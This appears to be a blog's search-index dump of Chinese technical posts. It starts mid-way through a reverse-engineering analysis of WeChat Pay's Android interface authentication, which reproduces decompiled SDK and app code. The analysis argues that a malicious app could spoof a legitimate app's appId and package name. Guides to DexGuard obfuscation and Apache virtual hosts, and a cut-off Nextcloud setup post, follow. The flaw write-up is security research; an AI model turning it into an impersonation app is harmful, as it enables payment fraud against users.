throw new IllegalStateException(&quot;sendReq fail, WXMsgImpl has been detached&quot;); } if (!WXApiImplComm.validateAppSignatureForPackage(this.context, &quot;com.tencent.mm&quot;, this.checkSignature)) { Log.e(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;sendReq failed for wechat app signature check failed&quot;); return false;} if (!paramBaseReq.checkArgs()) { Log.e(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;sendReq checkArgs fail&quot;); return false; } Log.i(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;sendReq, req type = &quot; + paramBaseReq.getType()); Bundle localBundle = new Bundle(); paramBaseReq.toBundle(localBundle); if (paramBaseReq.getType() == 5) { return sendPayReq(this.context, localBundle); } ...}这里 PayReq 对象的 Type 为 5， 订单请求对象 paramBaseReq 转化为 localBundle Android Bundle 对象，作为入参进入 sendPayReq() 分支WXApiImplV10.classprivate boolean sendPayReq(Context paramContext, Bundle paramBundle){ if (wxappPayEntryClassname == null) { wxappPayEntryClassname = new MMSharedPreferences(paramContext).getString(&quot;_wxapp_pay_entry_classname_&quot;, null); Log.d(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;pay, set wxappPayEntryClassname = &quot; + wxappPayEntryClassname); if (wxappPayEntryClassname == null) { try { wxappPayEntryClassname = paramContext.getPackageManager().getApplicationInfo(&quot;com.tencent.mm&quot;, 128).metaData.getString(&quot;com.tencent.mm.BuildInfo.OPEN_SDK_PAY_ENTRY_CLASSNAME&quot;, null); } catch (Exception localException) { Log.e(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;get from metaData failed : &quot; + localException.getMessage()); } } if (wxappPayEntryClassname == null) { Log.e(&quot;MicroMsg.SDK.WXApiImplV10&quot;, &quot;pay fail, wxappPayEntryClassname is null&quot;); return false; } } MMessageActV2.Args localArgs; (localArgs = new MMessageActV2.Args()).bundle = paramBundle; localArgs.targetPkgName = &quot;com.tencent.mm&quot;; localArgs.targetClassName = wxappPayEntryClassname; return MMessageActV2.send(paramContext, localArgs);}这里构造了请求微信支付所需的额外信息，和订单信息一起封装为 paramContext 对象，作为参数传递。程序走到 MMessageActV2.send()MMessageActV2.classpublic static boolean send(Context paramContext, Args paramArgs){ if ((paramContext == null) || (paramArgs == null)) { Log.e(&quot;MicroMsg.SDK.MMessageAct&quot;, &quot;send fail, invalid argument&quot;); return false; } if (d.a(paramArgs.targetPkgName)) { Log.e(&quot;MicroMsg.SDK.MMessageAct&quot;, &quot;send fail, invalid targetPkgName, targetPkgName = &quot; + paramArgs.targetPkgName); return false; } if (d.a(paramArgs.targetClassName)) { paramArgs.targetClassName = (paramArgs.targetPkgName + &quot;.wxapi.WXEntryActivity&quot;); } Log.d(&quot;MicroMsg.SDK.MMessageAct&quot;, &quot;send, targetPkgName = &quot; + paramArgs.targetPkgName + &quot;, targetClassName = &quot; + paramArgs.targetClassName); Intent localIntent; (localIntent = new Intent()).setClassName(paramArgs.targetPkgName, paramArgs.targetClassName); if (paramArgs.bundle != null) { localIntent.putExtras(paramArgs.bundle); } String str = paramContext.getPackageName(); localIntent.putExtra(&quot;_mmessage_sdkVersion&quot;, 620823552); localIntent.putExtra(&quot;_mmessage_appPackage&quot;, str); localIntent.putExtra(&quot;_mmessage_content&quot;, paramArgs.content); localIntent.putExtra(&quot;_mmessage_checksum&quot;, b.a(paramArgs.content, 620823552, str)); if (paramArgs.flags == -1) { localIntent.addFlags(268435456).addFlags(134217728); } else { localIntent.setFlags(paramArgs.flags); } try { paramContext.startActivity(localIntent); } catch (Exception paramContext) { Log.e(&quot;MicroMsg.SDK.MMessageAct&quot;, &quot;send fail, ex = &quot; + paramContext.getMessage()); return false; } Log.d(&quot;MicroMsg.SDK.MMessageAct&quot;, &quot;send mm message, intent=&quot; + localIntent); return true;}看到熟悉的 Intent 和 startActivity 了，如设想的一样，支付 SDK 最终启动了一个入口 activity，即微信暴露的 WXEntryActivity。上面的代码特别注意到两行String str = paramContext.getPackageName();...localIntent.putExtra(&quot;_mmessage_appPackage&quot;, str);在构造传递给微信的 Intent 时，微信 SDK 使用 Android Framework 提供的  getPackageName() API 添加了商户 APP 的包名，猜测包名关系到后续的接口认证。 我们回到微信官方开发者网，其中有一段描述是对商户接入微信支付平台的要求：商户需要在网站后台中预置「应用包名」和「应用签名」（精确的描述应当是「应用签名证书的摘要」），同时微信在网站上提供了一个专门的工具，用于获取「应用签名」注意该工具的提示信息「此工具仅用于获取安装到手机的第三方应用签名」，说明预注册于微信平台获取的签名来源于已安装的 APP，而未安装的APP是获取不到的，容易联想到用来做接口认证。凭借以往的开发经验，这个专门的工具一定用到了系统（Android Framework）接口来获取「应用签名」，同时我们有理由推测，微信在做接口认证时一样使用这个接口获取调用方的「应用签名」。按照这个思路简单搜索一下就可以发现 Android 其实提供了 PackageManager.getPackageInfo() 接口，该方法可返回指定应用的签名证书信息（signature），即微信所说的 「应用签名」⇒ 查看 getPackageInfo 的样例代码题外话：由于 APK 可以被多个私钥签名，因此接口返回的是 Signature 数组，在查看 Signature 类的 developer 文档时，发现一个有意思的描述： This class name is slightly misleading, since it’s not actually a signature.看起来「应用签名」错误叫法始作俑者是 Google？:)言归正传，为了验证微信使用的是 getPackageInfo() 的推测，我们反编译 Gen_Signature_Android.apk，发现事情确实如此，下面我摘抄了部分反编译出的关键 smali 代码.method private getRawSignature(Landroid/content/Context;Ljava/lang/String;)[Landroid/content/pm/Signature; ... invoke-virtual {v2, p2, v4}, Landroid/content/pm/PackageManager;-&amp;gt;getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo; ... :cond_2 iget-object v3, v1, Landroid/content/pm/PackageInfo;-&amp;gt;signatures:[Landroid/content/pm/Signature; goto :goto_0.end method.method private getSign(Ljava/lang/String;)V ... invoke-direct {p0, p0, p1}, Lcom/tencent/mm/openapi/MainAct;-&amp;gt;getRawSignature(Landroid/content/Context;Ljava/lang/String;)[Landroid/content/pm/Signature; ... .local v0, &quot;sign&quot;:Landroid/content/pm/Signature; invoke-virtual {v0}, Landroid/content/pm/Signature;-&amp;gt;toByteArray()[Bmove-result-object v5 invoke-static {v5}, Lcom/tencent/mm/openapi/MD5;-&amp;gt;getMessageDigest([B)Ljava/lang/String; move-result-object v1 .line 75 .local v1, &quot;signMd5&quot;:Ljava/lang/String;invoke-direct {p0, v1}, Lcom/tencent/mm/openapi/MainAct;-&amp;gt;stdout(Ljava/lang/String;)V .line 73 add-int/lit8 v3, v3, 0x1 goto :goto_0.end method现在我们知道获取应用的 signature 需要输入目标应用的包名，而包名通过 Android PackageManger 提供的 getPackageName() API 获取的。到目前为止，我们还只是分析了 Client-Server 架构中 client 侧的逻辑，基本可以推测出整体接口认证的实现，但终究还是要到微信 APP 中一探究竟。深入微信 APP下载微信v6.6.6，反编译后直奔入口 WXEntryActivity.samli微信客户端的 Java 代码做了混淆，但不影响我们分析。首先 getIntent() 获取商户 APP 发送过来的 Intent.class public Lcom/tencent/mm/plugin/base/stub/WXEntryActivity; ... .method public onCreate(Landroid/os/Bundle;)V .locals 3 .prologue .line 394 invoke-virtual {p0}, Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;-&amp;gt;getIntent()Landroid/content/Intent; ....end method然后，从 Intent 中提取商户 APP 包名，初始化为 WXEntryActivity 的成员变量 uN.class public Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;.method private B(Landroid/content/Intent;)Z ... const-string/jumbo v1, &quot;_mmessage_appPackage&quot; invoke-static {p1, v1}, Lcom/tencent/mm/sdk/platformtools/s;-&amp;gt;j(Landroid/content/Intent;Ljava/lang/String;)Ljava/lang/String; move-result-object v1 iput-object v1, p0, Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;-&amp;gt;uN:Ljava/lang/String; ....end method跟踪 uN 的去向，来到 WXEntryActivity.h() 方法.class public Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;.method private h(Lcom/tencent/mm/ab/l;)Z ... iget-object v4, p0, Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;-&amp;gt;appId:Ljava/lang/String; invoke-static {v4, v1}, Lcom/tencent/mm/pluginsdk/model/app/g;-&amp;gt;be(Ljava/lang/String;Z)Lcom/tencent/mm/pluginsdk/model/app/f; move-result-object v4 .line 601 if-nez v4, :cond_2 .line 602 const-string/jumbo v1, &quot;MicroMsg.WXEntryActivity&quot; const-string/jumbo v2, &quot;app not reg, do nothing&quot; invoke-static {v1, v2}, Lcom/tencent/mm/sdk/platformtools/w;-&amp;gt;w(Ljava/lang/String;Ljava/lang/String;)V goto :goto_0 .line 612 :cond_2 iget-object v5, p0, Lcom/tencent/mm/plugin/base/stub/WXEntryActivity;-&amp;gt;uN:Ljava/lang/String; invoke-static {p0, v4, v5}, Lcom/tencent/mm/pluginsdk/model/app/p;-&amp;gt;b(Landroid/content/Context;Lcom/tencent/mm/pluginsdk/model/app/f;Ljava/lang/String;)Z move-result v5 if-nez v5, :cond_3 ....end method注意其中一行`invoke-static {p0, v4, v5}, Lcom/tencent/mm/pluginsdk/model/app/p;-&amp;gt;b(Landroid/content/Context;Lcom/tencent/mm/pluginsdk/model/app/f;Ljava/lang/String;)Z`这里调用了 com.tencent.mm.pluginsdk.model.app.p 类的 b() 方法，第三个入参 v5 寄存器即为 uN那么第二个入参 v4 寄存器又是什么呢？我们注意到，在上述的代码中还构造了一个 com.mm.pluginsdk.model.app.f 对象，而这个对象是用 appId 初始化的。还记得 appId 吧，是商户在微信平台注册的 APP 唯一ID。进一步观察 f 类，发现这实际上代表了「商户APP信息」类，这个类的成员包含了：field_appName field_packageName field_signature …Good，这些不就是商户在微信开发者平台预注册时的信息吗？有理由推断在构造 f 类对象时，微信应当是根据 appId 从微信服务器端取回的这些信息， 也就是「已注册的服务端商户 APP 对象」。时间有限，与服务器端的通信这块内容就不做深入分析了。回到接收了 v4 （即「f 类对象」），v5（即 uN，接口调用方包名）的com.tencent.mm.pluginsdk.model.app.p.b() 方法.class public final Lcom/tencent/mm/pluginsdk/model/app/p; .method public static b(Landroid/content/Context;Lcom/tencent/mm/pluginsdk/model/app/f;Ljava/lang/String;)Z ... iget-object v2, p1, Lcom/tencent/mm/pluginsdk/model/app/f;-&amp;gt;field_packageName:Ljava/lang/String; invoke-virtual {v2, p2}, Ljava/lang/String;-&amp;gt;equals(Ljava/lang/Object;)Z move-result v2 if-nez v2, :cond_9 const-string/jumbo v2, &quot;MicroMsg.AppUtil&quot; const-string/jumbo v4, &quot;isAppValid, packageName is diff, src:%s,local:%s&quot; ....end method这里 p1 寄存器是「f 类对象」，而 p2 是 uN 即待验证调用方包名。b() 方法通过 iget-object 获取 p1 的 field_packageName 成员，然后与 p2 一起进行字符串比较 —— 比较待校验包名与根据 appId 获取的包名是否一致，如果不一致则走错误分支。原来，除了「应用签名」，微信其实还对调用方的包名和服务器端预注册的包名做了校验。接下来是「应用签名」的校验，与包名校验类似，但是在校验之前，使用系统提供的 PackageManager API 获取到了 uN （p2 寄存器）对应的「应用签名」.class public final Lcom/tencent/mm/pluginsdk/model/app/p;.method public static b(Landroid/content/Context;Lcom/tencent/mm/pluginsdk/model/app/f;Ljava/lang/String;)Z invoke-static {p0, p2}, Lcom/tencent/mm/pluginsdk/model/app/p;-&amp;gt;bh(Landroid/content/Context;Ljava/lang/String;)[Landroid/content/pm/Signature; ... :cond_9 const-string/jumbo v2, &quot;MicroMsg.AppUtil&quot; const-string/jumbo v5, &quot;server signatures:%s&quot; new-array v6, v0, [Ljava/lang/Object; iget-object v7, p1, Lcom/tencent/mm/pluginsdk/model/app/f;-&amp;gt;field_signature:Ljava/lang/String; aput-object v7, v6, v1 invoke-static {v2, v5, v6}, Lcom/tencent/mm/sdk/platformtools/w;-&amp;gt;i(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V .line 276 array-length v5, v4 move v2, v1 :goto_1 if-ge v2, v5, :cond_b aget-object v6, v4, v2 .line 277 invoke-virtual {v6}, Landroid/content/pm/Signature;-&amp;gt;toByteArray()[B move-result-object v6 invoke-static {v6}, Lcom/tencent/mm/a/g;-&amp;gt;u([B)Ljava/lang/String; move-result-object v6 invoke-static {v6}, Lcom/tencent/mm/pluginsdk/model/app/p;-&amp;gt;SZ(Ljava/lang/String;)Ljava/lang/String; move-result-object v6 .line 278 const-string/jumbo v7, &quot;MicroMsg.AppUtil&quot; const-string/jumbo v8, &quot;local signatures:%s&quot; new-array v9, v0, [Ljava/lang/Object; aput-object v6, v9, v1 invoke-static {v7, v8, v9}, Lcom/tencent/mm/sdk/platformtools/w;-&amp;gt;i(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/Object;)V .line 279 iget-object v7, p1, Lcom/tencent/mm/pluginsdk/model/app/f;-&amp;gt;field_signature:Ljava/lang/String; if-eqz v7, :cond_a iget-object v7, p1, Lcom/tencent/mm/pluginsdk/model/app/f;-&amp;gt;field_signature:Ljava/lang/String; invoke-virtual {v7, v6}, Ljava/lang/String;-&amp;gt;equals(Ljavalang/Object;)Z move-result v6 if-eqz v6, :cond_a .line 280 invoke-interface {v3, p1}, Lcom/tencent/mm/plugin/ac/a/a;-&amp;gt;d(Lcom/tencent/mm/pluginsdk/model/app/f;)V goto/16 :goto_0 .line 276 :cond_a add-int/lit8 v2, v2, 0x1 goto :goto_1 .line 285 :cond_b const-string/jumbo v0, &quot;MicroMsg.AppUtil&quot; const-string/jumbo v2, &quot;isAppValid, signature is diff&quot; invoke-static {v0, v2}, Lcom/tencent/mm/sdk/platformtools/w;- &amp;gt;w(Ljava/lang/String;Ljava/lang/String;)V .line 286 invoke-interface {v3, p1}, Lcom/tencent/mm/plugin/ac/a/a;-&amp;gt;c(Lcom/tencent/mm/pluginsdk/model/app/f;)V move v0, v1 .line 287 goto/16 :goto_0.end method至此，完成微信端的接口认证分析。总结微信支付的端侧接口认证实际上就是将 appId、packageName、调用方应用证书指纹（「应用签名」是不准确的说法）与服务器端预注册的值进行比较，从而防止非法应用接入微信支付系统。然而，这三个待验证参数中，只有调用方应用证书指纹是来自操作系统，而 appId、packageName 都是由调用方传入的（packageName 虽然由微信 SDK 通过系统接口获取，但是由于在客户端执行，实际上很容易绕过），这导致了仿冒的可能：恶意 APP 可以任意仿冒已安装于用户手机上的合法应用来仿冒其发起支付，通过在支付请求中构造被仿冒应用的 appId 和 packageName（这些信息都是公开的）。从安全角度看，微信这样的设计是不正确的。安全的设计应当是由服务端微信 APP 通过 Android 系统接口获取调用方包名，从而防止客户端仿冒。然而，博主在一番搜索之后并没有发现 Android Framework 提供了这样的接口，例如，通过发送方的 Intent 获取源应用包名，这或许能解释为什么微信竟然用客户端传递的包名来做认证。我想，造成这个安全问题的根本原因是 Android 系统并未提供从调用方 Intent 中获取包名的能力，这也许是 Android 的缺陷。" }, { "title": "Android DexGuard 混淆指南", "url": "/posts/guide-of-android-dexguard/", "categories": "Android", "tags": "DexGuard", "date": "2018-05-11 00:00:00 +0800", "snippet": "简介DexGuard 是一款付费代码混淆软件，主要功能是对 Java 代码进行混淆，使得反编译后得到的源代码可读性差，从而加大破解的难度。DexGuard 与 Android 上主流的混淆工具 ProGuard 同属一家公司开发，但相比免费的 ProGuard 功能更多，混淆力度也更大。详细异同参考：DexGuard vs. ProGuard。本篇教程将使用 DexGuard 8.1.14 版本，在 Ubuntu 14.04 server 编译环境下对 Android Gradle 工程进行混淆。入门要使用 DexGuard，首先要在原 Android 工程中集成 DexGuard 插件。编辑工程的 build.gradle 文件，导入 DexGuard 依赖vim project_root_build.gradlebuildscript { ... repositories { ... flatDir { dirs &#39;path_to_DexGuard-8.1.14/lib&#39;} } dependencies { ... classpath &#39;:dexguard:&#39; }}编辑 app 模块的 build.gradle 使能 Dexguard 插件vim project_root_app_module_dir_build.gradleapply plugin: &#39;dexguard&#39; android { ... defaultConfig { ... //DedGuard will handle multidex in stead of Gradle, so if your project needs multdex support, disable Gradle&#39;s multidex support here and add -multidex to your dexguard-projext.txt. //multiDexEnabled true ndk { abiFilters &quot;armeabi-v7a&quot; } } buildTypes { release { proguardFile getDefaultDexGuardFile(&#39;dexguard-release.pro&#39;) proguardFile &#39;dexguard-project.txt&#39; proguardFile &#39;proguard-project.txt&#39; } debug { proguardFile getDefaultDexGuardFile(&#39;dexguard-debug.pro&#39;) proguardFile &#39;dexguard-project.txt&#39; proguardFile &#39;proguard-project.txt&#39; } } }其中，dexguard-project.txt 为自定义规则文件，如果不存在，创建并将其放置在 app 模块目录。后续章节介绍如何制定规则。DexGuard 是付费软件，因此还需要指定 license。将你的 license 文件放置在用户 home 根目录下即可。你也可以参考 docs/ 下的指导文档，配置环境变量来指定 license 文件。配置好以后，就可以使用 Gradle 命令启动混淆版本的编译了./gradlew assembReleaseDexGuard 会参与 Gradle 的 release 编译和 debug 编译，但为了方便开发调试，默认只有 release 版本才会应用 DexGuard 的各种功能，包括优化、混淆、压缩等。要注意尽管 debug 版本不会应用 DexGuard 功能，其打包过程还是由 DexGuard 接管（ 代替 aapt） 。最后，你可通过反编译 apk 观察最终的混淆效果。另外，随编译输出的还有 mapping.txt 文件，该文件记录了本次混淆的映射表，后续可以用来恢复 stack trace。混淆基本原理与语法DexGuard 对 Java 的混淆原理是将类名或方法、成员名自动替换为无意义且难以阅读的字符，这存在一个问题：DexGuard 并非完全精确，一些依赖于类名、方法名的调用，类名、方法名可能被错误地混淆，从而导致无法链接而调用失败。举例来说：如果 JNI 中的 Java Native 方法名被混淆，将导致 C++ 库无法根据方法名链接 Java 代码。对于这种情况，我们就需要额外制定混淆规则保留 native 方法名及其所在的类名。-keepclasseswithmembernames,includedescriptorclasses class * { native &amp;lt;method&amp;gt;;}实际上，混淆规则的本质是帮助 DexGuard 识别程序的入口（Entry Point）。所谓入口，最容易理解的是程序的 main 方法，如果 main 方法都被混淆了，那么 Java 程序肯定就启动不了。此外， Entry Point 通常还包括 applets，midlets，activities。与此相反，类内部的 private 方法则一般不是 Entry Point，因为只在类内部调用，并不会暴露给外部。DexGuard 的混淆规则语法与 Proguard 兼容。下面列举比较常用的语法：keep - 将指定的类及成员保留 * - 匹配任意类名，但只匹配当前包目录，不跨界 ** - 匹配任意类名，且可跨目录匹配例如：-keep class android.support.v7.widget.SearchView { public &amp;lt;method&amp;gt;;}上面的规则表示将 class android.support.v7.widget.SearchView 类的类名名和该类的 public 方法保留。更多语法内容请参考官网。规则制定过程总结DexGuard 实际上已经能够自动识别一些 Entry Point，例如部分反射调用，此外还会根据你的工程所属平台启用子带的通用型规则。但是特定工程还是需要人工适配混淆规则。这里博主结合此前使用 ProGuard 的经验，提供 DexGuard 制定规则的一般步骤与思路。Step 1 - 对于使用第三方库，或基于第三方开源软件开发的工程，首先去对应的第三方项目中寻找混淆规则，第三方库通常已经为我们做了这项工作例如，代码量极其庞大的 Chromium 工程，比较明智的做法是站在巨人肩膀上。Step 2 - 编译输出中包含 Warning 和 Note 告警信息，导致编译不通过，根据告警提供的信息使用相应的混淆规则或确认误报，然后使用如下规则清除告警：-dontwarn class_filter-dontnote class_filterStep 3 - 识别项目特定规则跨 runtime 的方法调用，例如 V8 JavaScript 使用方法名调用 Java native 方法（JS/Native Bridge），显然不能让 Java 方法被混淆。JS/Native Java 代码@JSMethodpublic void pay(String payReq, JSCallback success, JSCallback fail, JSCallback complete) {...}混淆规则-keepclassmembers class * { @com.taobao.weex.annotation.JSMethod &amp;lt;method&amp;gt;;}这里我们利用  @JSMethod annotation 来匹配工程中所有的 JS/Native 方法。Step 4 - 观察日志，根据关键崩溃信息制定规则。典型场景如类名误混淆导致的崩溃 stack trace 如下W System.err: Caused by: java.lang.ClassNotFoundException: Didn&#39;t find class &quot;org.chromium.chrome.browser.preferences.ExpandablePreferenceGroup&quot;解决方法也很简单，在混淆规则中使用 -keep 语句保留住该类即可-keep class org.chromium.chrome.browser.preferences.ExpandablePreferenceGroup混淆规则制定过程中 crash 在所难免，有一个小技巧是通过大范围的 -keep 先让工程跑起来，然后逐步缩小 keep 的范围，从而定位具体误混淆的类。ReTrace 恢复日志混淆加大了黑客反编译的难度，但也给开发者造成了障碍：经过混淆的 apk 异常抛出错误时，trace 信息也是混淆的，不利于开发调试。DexGuard 提供的 ReTrace 工具能够读取混淆的 stack trace 然后恢复成未混淆时的模样。这个过程依赖上文提到的 mapping 文件，该文件记录了混淆前和混淆后的类名、成员名的映射关系&amp;lt;project_root&amp;gt;/&amp;lt;app_module&amp;gt;/build/outputs/mapping/release/mapping.txtmapping 文件每个编译版本不同（除非特别指定），开发者需要记录发布版本和 mapping 文件的对应关系。要恢复 stack trace， 准备好你的 mapping.txt 和 stacktrace_obfuscated.log，使用下面的命令完成恢复cd DexGuard-8.1.14/bin./retrace.sh mapping.txt stacktrace_obfuscated.log &amp;gt; stacktrace_restored.log常见问题参见此前的文章 - DexGuard Android Project Troubleshooting" }, { "title": "DexGuard 常见问题解决", "url": "/posts/dexguard-troubleshooting/", "categories": "Android", "tags": "DexGuard", "date": "2018-05-09 00:00:00 +0800", "snippet": "multidex 错误Android 对单个工程包含的总方法数有限制，最多是 65535 个。如果工程较大，方法数超过这个数目，就要使用 multidex 技术，否则将会运行错误。multidex 将原来编译出的 dex 文件分割为多个子 dex 文件，APP 运行时再拼接起来。DexGuard 使用自己实现的 multidex 支持，因而使用上需要一些配置。错误日志Overflow detected while writing dex file &#39;classes.dex&#39;: Too many method references : 92180; max is 65535You may try using configuration &#39;dexguard-debug-chrink.pro&#39; for debug builds or enable multilex support.Please refer to the documentation for more information.`* What went wrongExecuting failed for task &#39;:chrome:dexguardDebug&#39;.&amp;gt; Writing of dex file &#39;classes.dex&#39; failed due to overflow解决办法在 dexguard-project.txt 中配置如下字段，打开 DexGuard 的 multidex 支持开关...-multidex压缩了不该压缩的 assetsAndroid 对于 assets 资源的压缩有限制。因为对于 assets 压缩文件，apk 在运行时需要映射至内存然后解压为直接可用的格式。这就要求被压缩文件不能过大，否则近乎双倍于原文件的内存占用，会造成大量内存消耗。对 mp3、ogg 等天然压缩文件类型，aapt 在打包时会自动忽略压缩，运行时直接映射至内存。而对于非压缩文件类型，如果该文件过大（&amp;gt; 1M），我们就必须手工指定忽略压缩，否则会出现运行错误。错误日志E ApkAssets: Error while loading assets/icudtl.dat:java.io.FileNotFoundException: This file can not be opened as a file descriptior; it is probably compressed分析：查看 gradle 工程 app 模块的 build.gradle，可以看见原 gradle 工程对 dat 后缀文件是指定忽略压缩的，因为 icudtl.dat 远大于 1M./build.gradle...aaptOptions { noCompress &quot;dat&quot;, &quot;bin&quot;, &quot;pak&quot;}但是，DexGuard 的打包系统与 aapt 独立，aapt 的配置并不生效，assets/icudtl.dat 被误压缩。此外，我们知道 apk 包实际上就是 zip 压缩格式，因此还可以用 unzip -lv 命令看看混淆编译出的 apk 中每个文件的压缩处理情况。其中「method」一栏用 「Stored」 表示该文件为存储型（不压缩）;「Defl」表示该文件是被压缩。博主使用此命令查看存在问题的混淆 apk 版本，发现 assets/icudtl.dat 文件标识为「Defl」，可见确实被 DexGuard 错误地压缩了。解决办法 Dexguard incidentally does perform the final packaging . It has an option -dontcompress to control which files or filetype are left uncompressed . The default configuration leaves . ogg and .Me files uncompressed.assets 压缩错误有些 assets 文件，原 gradle 工程并未指定忽略压缩，但是在 DexGuard build 下却存在压缩异常，混淆版本崩溃时机通常发生在读取 assets 文件时错误日志D ApkAssets: copy from assets/as block to /data/user/0/com.foo.bar/app_hbs/adblockW System.err: Java.lang.NoClassDefFoundError: Failed resolution of : Lcom/google/devtools/build/android/desugar/runtime/ThrowableExtention;System.err: at org.chromium.base.ApkAssets.copySystem.err: Caused by: java.lang.ClassNotFoundException: Didn&#39;t find class com.google.devtools.build.android.desugar.runtime.ThrowableExtention&quot; on path: DexPathList [[zip file &quot;/data/app/...&quot;], nativeLibraryDirectories=[/data/app/...]]可看到 assets manager 在 copy adblock 文件后立即发生崩溃错误，博主猜测是 DexGuard 未正常处理该文件的压缩事宜。解决办法尝试在 DexGuard 规则文件中使用以下规则排除该文件的压缩-dontcompress **/adblock问题解决" }, { "title": "CentOS 7 Apache 配置 Virtual Host （虚拟主机）", "url": "/posts/set-up-apache-virtual-hosts/", "categories": "Web", "tags": "Apache", "date": "2018-05-06 00:00:00 +0800", "snippet": "简介Apache 是世界上最流行的网页服务器，其功能和组件被分解为不同的单元与功能，其中基础的配置单元是站点（域名）。Apache 用 Virtul Host 表示站点，通过支持多 Virtual Host ，便能够在单个服务器上托管多个站点，共享服务器资源，而且保持互相独立。这里要注意子域名和一级域名一样，都可作为不同的 Virtual Host 进行配置。这篇教程，将介绍在 CentOS 7 VPS 上如何配置多个 Apache Virtual Host。提前准备要使用此教程，你至少要有一个可用的域名（包括子域名）。下面的教程假设你有 example.com 和 example2.com 两个域名需要配置 Apache Virtual Host。Step 1 - 创建目录结构首先，我们要为不同域名（站点）分别创建存放网页数据的目录。sudo mkdir /var/www/example.com/htmlsudo mkdir /var/www/example2.com/html注意： example.com、example2.com 为你想配置的站点，这里引入 html 二级目录作为 Virtual Host 的根目录，是为了与日志文件等隔离开，如果你要创建的站点是 WordPress、Nextcloud 等服务，可将 html 变更为相应的服务名称。CentOS 7 未引入  sites-enabled 、sites-available 目录结构，我们需要为 Apache 创建 这两个目录（这样有利于后续灵活直观地管理 Virtual Host）sudo mkdir /etc/httpd/sites-availablesudo mkdir /etc/httpd/sites-enabled提示：你应该将可用 Virtual Host 配置文件统统存储在 site-available 目录下，而在 sites-enabled 目录下配置已启用的 Virtual Host。现在，让 Apache 加载 sites-enabled 目录下的配置文件。编辑 http.conf，尾部增加一行， IncludeOptional sites-enabled/*.confsudo vim /etc/httpd/conf/httpd.conf ...IncludeOptional sites-enabled/*.confStep 2 - 创建新 Virtual Host 配置文件创建 example.com.conf 文件，指定 /var/www/example.com/html 为 DocumentRootsudo vim /etc/httpd/sites-available/example.com.conf&amp;lt;VirtualHost *:80&amp;gt; ServerName example.com DocumentRoot /var/www/example.com/html ErrorLog /var/www/example.com/error.log CustomLog /var/www/example.com/requests.log combined&amp;lt;/VirtualHost&amp;gt;&amp;lt;Directory /var/www/example.com/html&amp;gt; Options -Indexes -FollowSymLinks AllowOverride None Require all granted&amp;lt;/Directory&amp;gt;# 某些服务如 Nextcloud 需要覆写 .htaccess ，那么使用下面的配置#&amp;lt;Directory /var/www/example.com/nextcloud&amp;gt;# AllowOverride All#    Require all granted#&amp;lt;/Directory&amp;gt;这里 &amp;lt;VirtualHost *:80&amp;gt;...&amp;lt;/VirtualHost&amp;gt; 表示监听 80 端口的一个 Virtual Host， ServerName 指明 Virtual Host 的绑定的域名； DocumentRoot 指定 Virtual Host 的根目录（ 意味着 example.com 对 html 目录外的访问都将被禁止）；ErrorLog 、CustomLog 指定日志存储目录。出于安全考虑，我们在 &amp;lt;Directory /...;&amp;lt;/Directory&amp;gt; 标签中使用 -Indexes 禁止目录浏览；使用 -FollowSymLinks 禁止符号链接逃逸 document root；AllowOverride None 不允许 .htaccess 覆写；Require all granted 允许所有 IP 连接。注意：&amp;lt;Directory /...&amp;gt; 应使用绝对路径；新版本 Apache 已不允许 Options -Indexes FollowSymLinks 这种既有+/-参数又有非+/-参数的写法，应该统一写成 Options -Indexes +FollowSymLinks ，或去掉 -Indexes 。Step 3 - 使能 Virtual Host 文件现在，要让先前创建的 Virtual Host 配置文件生效了。在 site-enabled 目录下建立 example.com.conf 的软连接sudo ln -s /etc/httpd/sites-available/example.com.conf /etc/httpd/sites-enabled/example.com.conf重启 Apache ，使配置生效apachectl restartStep 4 - 测试最终结果在 /var/www/example.com/html 放置你要展示的 index.html ，然后使用浏览器访问 http://example.com 。若一切正常，你的页面将正常展示。接下来去完成另一个域名 example1.com 的配置吧。Step 5 - 指定默认 Virtual Host （可选）现在我们配置了多个站点，Apache 将会根据访问不同域名匹配不同的 Virtual Host，一切正常。但是，如果访问的域名与任何 ServerName 都不匹配，例如使 IP 访问时将连接哪个 Virtual Host 呢？配置文件第一个被加载的为默认 Virtual Host。在本文场景中，我们配置了 example.com.conf 和 example2.com.conf 两个 Virtual Host，Apache 会首先加载 example.con.conf 然后加载 example2.com.conf ，依据文件名排序。也就是说，如果使用 IP 访问站点，加载的将会是 example.com 。如果你想让 example2.com 成为默认的站点，可以在将其配置文件命名为 0-example2.com.conf 。要自定义默认 Virtual Host，通常的做法是建立一个 000-default.conf 的配置文件。" }, { "title": "大容量 VPS 搭建 Nextcloud 个人云盘 + aria2 在线下载", "url": "/posts/install-nextcloud-and-aria2/", "categories": "Tutorial, NAS", "tags": "NAS", "date": "2018-05-04 00:00:00 +0800", "snippet": "简介Nextcloud 是一套用于创建网络硬盘的客户端－服务器开源软件，使用与 Dropbox 相近。每个人都可以在私人服务器上安装并运行它。aria2 是一款流行的开源下载工具，支持多种协议，包括磁力链接和 BT。Resillio Sync，你可能已经听说过这款神奇的文件同步软件，在本文中会作为 aria2 BT下载功能的补充。这篇教程所使用的环境是 CentOS 7 LAMP (Linux, Apache, MySQL, and PHP)提前准备 选购大硬盘 VPS 并安装 CentOS 7。如果你觉得这篇文章有帮助可以前往优惠链接购买 Hostens Storage VPS，遵从官网指引订购即可这里需要提醒，Hostens 机房到国内速度不稳定，如果在意这一点的谨慎购买。博主因为使用 SS 等代理连接，速度很快，可以忽略。 安装Apache 或 Nginx，Hostens VPS 可选的 CentOS 7 系统镜像已带有 Apache，本文直接使用 Apache 配置域名 DNS，并解析至你的 VPS IPStep 1 - 安装 PHP7.2CentOS 7 默认 PHP 版本不满足最低求，你需要启用 EPEL 和 Remi 库。sudo yum install https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpmsudo yum install http://rpms.remirepo.net/enterprise/remi-release-7.rpm为了使用 yum-config-manager 命令，安装 yum-utilssudo yum install 